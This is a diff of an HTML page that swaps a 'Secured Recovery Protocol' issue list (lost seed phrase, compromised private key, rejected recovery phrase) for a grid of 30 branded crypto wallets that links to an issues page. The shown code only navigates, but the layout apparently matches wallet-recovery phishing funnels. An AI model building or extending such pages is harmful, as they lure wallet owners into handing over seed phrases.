@@ -3,192 +3,262 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Select Issue - Secured Recovery Protocol</title>
+    <title>Select Wallet</title>
     <style>
         body { 
             margin: 0; 
             background-color: #000; 
             color: white; 
             font-family: system-ui, -apple-system, sans-serif; 
+            padding: 20px; 
+            max-width: 600px; 
+            margin: 0 auto; 
+        }
+        h1 { font-size: 22px; text-align: center; margin-bottom: 20px; }
+        
+        .wallet-grid { 
+            display: grid; 
+            grid-template-columns: repeat(2, 1fr); 
+            gap: 15px; 
+        }
+        
+        .wallet-card { 
+            background: #111; 
+            border: 1px solid #333; 
+            border-radius: 12px; 
+            padding: 15px; 
             display: flex; 
             flex-direction: column; 
             align-items: center; 
-            min-height: 100vh; 
-            padding: 20px; 
+            cursor: pointer; 
+            transition: all 0.2s;
+        }
+        .wallet-card:hover { 
+            border-color: #2563eb; 
+            background: #1a1a1a; 
         }
         
-        header {
-            width: 100%;
-            max-width: 800px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 0;
-            margin-bottom: 40px;
-        }
-        
-        .logo {
-            font-weight: bold;
-            font-size: 16px;
-            letter-spacing: 1px;
-            cursor: pointer;
-        }
-        
-        main {
-            width: 100%;
-            max-width: 700px;
-        }
-        
-        h1 {
-            font-size: 28px;
+        .wallet-icon { 
+            width: 48px; 
+            height: 48px; 
+            background: #333; 
+            border-radius: 50%; 
             margin-bottom: 10px;
-            text-align: center;
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            font-weight: bold;
+            font-size: 12px;
+            color: #aaa;
         }
         
-        .subtitle {
-            text-align: center;
-            color: #999;
-            margin-bottom: 40px;
-            font-size: 15px;
+        .wallet-name { 
+            font-size: 14px; 
+            text-align: center; 
+            line-height: 1.3;
         }
-
-        /* Issue List Styling */
-        .issue-list {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .issue-card {
-            background-color: #111;
-            border: 1px solid #333;
-            border-radius: 8px;
-            padding: 20px;
-            transition: all 0.2s ease;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .issue-card:hover {
-            background-color: #1a1a1a;
-            border-color: #555;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(255, 255, 255, 0.05);
-        }
-
-        .issue-title {
-            font-weight: 700;
-            font-size: 16px;
-            margin-bottom: 6px;
-            color: #fff;
-            display: block;
-        }
-
-        .issue-desc {
-            color: #888;
-            font-size: 14px;
-            line-height: 1.4;
-            margin: 0;
-        }
-
-        /* Add a subtle arrow icon on hover */
-        .issue-card::after {
-            content: "→";
-            position: absolute;
-            right: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            opacity: 0;
-            transition: opacity 0.2s;
-            color: #2563eb;
-        }
-
-        .issue-card:hover::after {
-            opacity: 1;
-        }
-
-        footer {
-            margin-top: auto;
-            padding-top: 40px;
-            color: #555;
-            font-size: 12px;
+        
+        .back-link { 
+            display: block; 
+            text-align: center; 
+            margin-top: 20px; 
+            color: #2563eb; 
+            text-decoration: none; 
         }
     </style>
 </head>
 <body>
+    <h1>Select Your Wallet</h1>
 
-    <header>
-        <div class="logo" onclick="window.location.href='index.html'">SECURED-RECOVERY-PROTOCOL</div>
-        <!-- Optional: Back button or logo link -->
-    </header>
-
-    <main>
-        <h1>Select an Issue</h1>
-        <p class="subtitle">Choose the category that best describes your problem below.</p>
-
-        <div class="issue-list">
-
-            <!-- TRANSACTION-DELAY -->
-            <div class="issue-card" onclick="alert('Navigating to Transaction Delay details...')">
-                <span class="issue-title">TRANSACTION-DELAY</span>
-                <p class="issue-desc">Click here for any transaction related error.</p>
-            </div>
-
-            <!-- LOCKED-DATA -->
-            <div class="issue-card" onclick="alert('Navigating to Locked Data details...')">
-                <span class="issue-title">LOCKED-DATA</span>
-                <p class="issue-desc">Corrupted wallet data</p>
-            </div>
-
-            <!-- LOGIN-ERROR -->
-            <div class="issue-card" onclick="alert('Navigating to Login Error details...')">
-                <span class="issue-title">LOGIN-ERROR</span>
-                <p class="issue-desc">Error messages during wallet import</p>
-            </div>
-
-            <!-- EXCHANGE -->
-            <div class="issue-card" onclick="alert('Navigating to Exchange details...')">
-                <span class="issue-title">EXCHANGE</span>
-                <p class="issue-desc">Click here for token exchange or to resolve errors encountered during token exchange</p>
-            </div>
-
-            <!-- ADDRESS-ERROR -->
-            <div class="issue-card" onclick="alert('Navigating to Address Error details...')">
-                <span class="issue-title">ADDRESS-ERROR</span>
-                <p class="issue-desc">Incorrect wallet address format</p>
-            </div>
-
-            <!-- PRIVACY-COMPROMISED -->
-            <div class="issue-card" onclick="alert('Navigating to Privacy Compromised details...')">
-                <span class="issue-title">PRIVACY-COMPROMISED</span>
-                <p class="issue-desc">Private key compromised</p>
-            </div>
-
-            <!-- PHRASE-ERROR -->
-            <div class="issue-card" onclick="alert('Navigating to Phrase Error details...')">
-                <span class="issue-title">PHRASE-ERROR</span>
-                <p class="issue-desc">Recovery phrase not accepted</p>
-            </div>
-
-            <!-- LOST-CREDENTIALS -->
-            <div class="issue-card" onclick="alert('Navigating to Lost Credentials details...')">
-                <span class="issue-title">LOST-CREDENTIALS</span>
-                <p class="issue-desc">Seed phrase backup lost</p>
-            </div>
-
-            <!-- WALLET-MALFUNCTION -->
-            <div class="issue-card" onclick="alert('Navigating to Wallet Malfunction details...')">
-                <span class="issue-title">WALLET-MALFUNCTION</span>
-                <p class="issue-desc">Slow wallet UI response</p>
-            </div>
-
+    <div class="wallet-grid">
+        <!-- 1. Trust Wallet -->
+        <div class="wallet-card" onclick="selectWallet('Trust Wallet')">
+            <div class="wallet-icon">🛡️</div>
+            <div class="wallet-name">Trust Wallet</div>
         </div>
-    </main>
+        
+        <!-- 2. MetaMask -->
+        <div class="wallet-card" onclick="selectWallet('MetaMask')">
+            <div class="wallet-icon">🦊</div>
+            <div class="wallet-name">MetaMask</div>
+        </div>
 
-    <footer>
-        © 2026 Secured Recovery Protocol. All rights reserved.
-    </footer>
+        <!-- 3. Phantom -->
+        <div class="wallet-card" onclick="selectWallet('Phantom')">
+            <div class="wallet-icon">👻</div>
+            <div class="wallet-name">Phantom</div>
+        </div>
 
+        <!-- 4. OKX Wallet -->
+        <div class="wallet-card" onclick="selectWallet('OKX Wallet')">
+            <div class="wallet-icon">⚫</div>
+            <div class="wallet-name">OKX Wallet</div>
+        </div>
+
+        <!-- 5. Binance Wallet -->
+        <div class="wallet-card" onclick="selectWallet('Binance Wallet')">
+            <div class="wallet-icon">🟡</div>
+            <div class="wallet-name">Binance Wallet</div>
+        </div>
+
+        <!-- 6. Bitget Wallet -->
+        <div class="wallet-card" onclick="selectWallet('Bitget Wallet')">
+            <div class="wallet-icon">🔵</div>
+            <div class="wallet-name">Bitget Wallet</div>
+        </div>
+
+        <!-- 7. Coinbase Wallet -->
+        <div class="wallet-card" onclick="selectWallet('Coinbase Wallet')">
+            <div class="wallet-icon">🔵</div>
+            <div class="wallet-name">Coinbase Wallet</div>
+        </div>
+
+        <!-- 8. Ledger -->
+        <div class="wallet-card" onclick="selectWallet('Ledger')">
+            <div class="wallet-icon">📱</div>
+            <div class="wallet-name">Ledger</div>
+        </div>
+
+        <!-- 9. TokenPocket -->
+        <div class="wallet-card" onclick="selectWallet('TokenPocket')">
+            <div class="wallet-icon">🟢</div>
+            <div class="wallet-name">TokenPocket</div>
+        </div>
+
+        <!-- 10. imToken -->
+        <div class="wallet-card" onclick="selectWallet('imToken')">
+            <div class="wallet-icon">🔷</div>
+            <div class="wallet-name">imToken</div>
+        </div>
+
+        <!-- 11. Trezor -->
+        <div class="wallet-card" onclick="selectWallet('Trezor')">
+            <div class="wallet-icon">🔒</div>
+            <div class="wallet-name">Trezor</div>
+        </div>
+
+        <!-- 12. Exodus -->
+        <div class="wallet-card" onclick="selectWallet('Exodus')">
+            <div class="wallet-icon">🌌</div>
+            <div class="wallet-name">Exodus</div>
+        </div>
+
+        <!-- 13. Rabby Wallet -->
+        <div class="wallet-card" onclick="selectWallet('Rabby Wallet')">
+            <div class="wallet-icon">🐰</div>
+            <div class="wallet-name">Rabby Wallet</div>
+        </div>
+
+        <!-- 14. SafePal -->
+        <div class="wallet-card" onclick="selectWallet('SafePal')">
+            <div class="wallet-icon">🛡️</div>
+            <div class="wallet-name">SafePal</div>
+        </div>
+
+        <!-- 15. Bybit Wallet -->
+        <div class="wallet-card" onclick="selectWallet('Bybit Wallet')">
+            <div class="wallet-icon">🟠</div>
+            <div class="wallet-name">Bybit Wallet</div>
+        </div>
+
+        <!-- 16. Ronin Wallet -->
+        <div class="wallet-card" onclick="selectWallet('Ronin Wallet')">
+            <div class="wallet-icon">🟣</div>
+            <div class="wallet-name">Ronin Wallet</div>
+        </div>
+
+        <!-- 17. Keplr -->
+        <div class="wallet-card" onclick="selectWallet('Keplr')">
+            <div class="wallet-icon">🦊</div>
+            <div class="wallet-name">Keplr</div>
+        </div>
+
+        <!-- 18. Solflare -->
+        <div class="wallet-card" onclick="selectWallet('Solflare')">
+            <div class="wallet-icon">🔥</div>
+            <div class="wallet-name">Solflare</div>
+        </div>
+
+        <!-- 19. Rainbow -->
+        <div class="wallet-card" onclick="selectWallet('Rainbow')">
+            <div class="wallet-icon">🌈</div>
+            <div class="wallet-name">Rainbow</div>
+        </div>
+
+        <!-- 20. Zerion -->
+        <div class="wallet-card" onclick="selectWallet('Zerion')">
+            <div class="wallet-icon">⚪</div>
+            <div class="wallet-name">Zerion</div>
+        </div>
+
+        <!-- 21. Backpack -->
+        <div class="wallet-card" onclick="selectWallet('Backpack')">
+            <div class="wallet-icon">🎒</div>
+            <div class="wallet-name">Backpack</div>
+        </div>
+
+        <!-- 22. Argent -->
+        <div class="wallet-card" onclick="selectWallet('Argent')">
+            <div class="wallet-icon">💎</div>
+            <div class="wallet-name">Argent</div>
+        </div>
+
+        <!-- 23. Safe -->
+        <div class="wallet-card" onclick="selectWallet('Safe')">
+            <div class="wallet-icon">🛡️</div>
+            <div class="wallet-name">Safe</div>
+        </div>
+
+        <!-- 24. World App -->
+        <div class="wallet-card" onclick="selectWallet('World App')">
+            <div class="wallet-icon">🌍</div>
+            <div class="wallet-name">World App</div>
+        </div>
+
+        <!-- 25. Atomic Wallet -->
+        <div class="wallet-card" onclick="selectWallet('Atomic Wallet')">
+            <div class="wallet-icon">⚛️</div>
+            <div class="wallet-name">Atomic Wallet</div>
+        </div>
+
+        <!-- 26. Guarda -->
+        <div class="wallet-card" onclick="selectWallet('Guarda')">
+            <div class="wallet-icon">👁️</div>
+            <div class="wallet-name">Guarda</div>
+        </div>
+
+        <!-- 27. Math Wallet -->
+        <div class="wallet-card" onclick="selectWallet('Math Wallet')">
+            <div class="wallet-icon">🧮</div>
+            <div class="wallet-name">Math Wallet</div>
+        </div>
+
+        <!-- 28. Coinomi -->
+        <div class="wallet-card" onclick="selectWallet('Coinomi')">
+            <div class="wallet-icon">💰</div>
+            <div class="wallet-name">Coinomi</div>
+        </div>
+
+        <!-- 29. Electrum -->
+        <div class="wallet-card" onclick="selectWallet('Electrum')">
+            <div class="wallet-icon">⚡</div>
+            <div class="wallet-name">Electrum</div>
+        </div>
+
+        <!-- 30. Tangem -->
+        <div class="wallet-card" onclick="selectWallet('Tangem')">
+            <div class="wallet-icon">💳</div>
+            <div class="wallet-name">Tangem</div>
+        </div>
+    </div>
+
+    <a href="index.html" class="back-link">← Back to Home</a>
+
+    <script>
+        function selectWallet(walletName) {
+            // Redirect to issues page, passing the wallet name as a parameter
+            window.location.href = `issues.html?wallet=${encodeURIComponent(walletName)}`;
+        }
+    </script>
 </body>
-</html>
+</html
